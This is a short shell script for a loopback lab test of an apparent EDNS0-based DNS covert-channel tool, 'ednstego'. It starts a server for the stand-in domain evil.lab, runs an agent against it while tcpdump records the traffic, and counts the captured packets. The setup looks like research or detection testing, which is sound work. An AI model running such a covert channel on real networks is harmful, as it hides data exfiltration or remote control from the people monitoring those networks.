cd ~/edns0-arbitrary && source .venv/bin/activate
mkdir -p out/t1 && cd out/t1

python3 -m ednstego.server --listen 127.0.0.1 --port 5300 --domain evil.lab & SERVER_PID=$!
sleep 2
sudo tcpdump -i lo -w /tmp/t1.pcap udp port 5300 & TCPDUMP_PID=$!
sleep 1
python3 -m ednstego.agent --server evil.lab --resolver 127.0.0.1 --mode t1 --duration 20 2>&1 | tee agent-t1.txt
sudo kill $TCPDUMP_PID 2>/dev/null
kill $SERVER_PID 2>/dev/null
sleep 1

echo "=== pacotes capturados ==="; sudo tcpdump -r /tmp/t1.pcap 2>/dev/null | wc -l
